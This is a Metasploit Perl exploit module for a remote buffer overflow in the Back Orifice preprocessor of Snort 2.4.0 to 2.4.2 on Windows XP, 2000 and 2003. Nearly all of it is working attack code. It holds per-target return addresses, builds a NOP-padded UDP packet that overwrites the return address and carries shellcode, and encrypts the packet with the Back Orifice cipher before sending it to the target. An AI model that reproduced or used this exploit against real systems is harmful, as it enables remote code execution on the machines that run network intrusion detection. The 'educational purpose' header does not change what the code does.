Snort <= 2.4.2 BackOrifice Remote Buffer Overflow Exploit (meta)
================================================================

###############################################################
# for educational purpose only
# by Kira < trir00t [at] gmail.com >
###############################################################
package Msf::Exploit::snort_bo_overflow_win32;
use base &#039;Msf::Exploit&#039;;
use strict;
use Pex::Text;

my $holdrand;
my $advanced = {};

my $info = 
{
	&#039;Name&#039; => &#039;Snort Back Orifice Preprocessor Overflow&#039;,
	&#039;Version&#039; => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039; => [ &#039;Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>&#039;, ],
	&#039;Arch&#039; => [&#039;x86&#039;],
	&#039;OS&#039; => [&#039;win32&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039;],
	&#039;Priv&#039; => 1,
	&#039;UserOpts&#039; => {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 53],
	},

	&#039;Payload&#039; => {
		&#039;Space&#039; => 1024, # you can use more spaces
		&#039;BadChars&#039; => "\x00",
	},

	&#039;Description&#039; => Pex::Text::Freeform(qq{
		This exploits the buffer overflow in Snort version 
		2.4.0 to 2.4.2. This particular module is capable of
		exploiting the bug on x86 Win32, Win2000, WinXP and Win2003. 
		Exploitation in this vulnerability is depend on many factors. 
		Difference in GCC version, compiled option and 
		operating system made diffent technique in exploitation.
	}),

	&#039;Refs&#039; => [
		[&#039;URL &#039;, "http://www.securityfocus.com/bid/15131"],
	],	
	
	&#039;Targets&#039; => [

	["Snort 2.4.2 Binary on Windows XP Professional SP1", 0x77da54d4,
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows XP Professional SP2", 0x77daacdb, 
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows Server 2003 SP1", 0x7d065177, 
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows Server 2000 SP0", 0x77e33f69,
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows 2000 Professional SP0", 0x7850cdef,
		(18+1024+1028+1024)],
	],

	&#039;Keys&#039; => [&#039;Snort&#039;],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return ($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;

	my $target = $self->Targets->[$target_idx];

	if(! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $socket = Msf::Socket::Udp->new
		(
			&#039;PeerAddr&#039; => $target_host,
			&#039;PeerPort&#039; => $target_port,
			&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		);

	if($self->IsError) {
		$self->PrintLine("[*] Error creating socket: " . 
						$socket->GetError);
	}

	$self->PrintLine(sprintf("[*] Trying " . $target->[0] . " using return address 0x%.8x....", $target->[1]));

	my $payload = "*!*QWTY?";		# Magic string: 8 bytes
	$payload .= pack(&#039;V&#039;, $target->[2]);	# Len: 4 bytes
	$payload .= "\xed\xac\xef\x0d";		# UDP packet id
	$payload .= "\x01";			# BO type (PING)
	$payload .= "\x90" x 1024;		# Data
	$payload .= "\x90" x 1024;		# offset to EIP
	$payload .= pack(&#039;V&#039;, $target->[1]);	# return address
	$payload .= $shellcode;			# our shellcode

	$payload = bocrypt($payload);		# encrypted payload

	$self->PrintLine("[*] Sending Exploit....");
	$socket->Send($payload);
}

sub bocrypt {
	my $tmppayload = shift;
	my @arrpayload = split(//, $tmppayload);
	my $retpayload;
	my $c;
	
	msrand(31337);

	foreach $c (@arrpayload) {
		$retpayload .= chr((ord($c) ^ (mrand()%256)));
	}
	return ($retpayload);
}

sub msrand {
	$holdrand = shift;
}

sub mrand {
	return ((($holdrand = ($holdrand * 214013 + 2531011 & 0xffffffff)) >> 16) & 0x7fff);
}


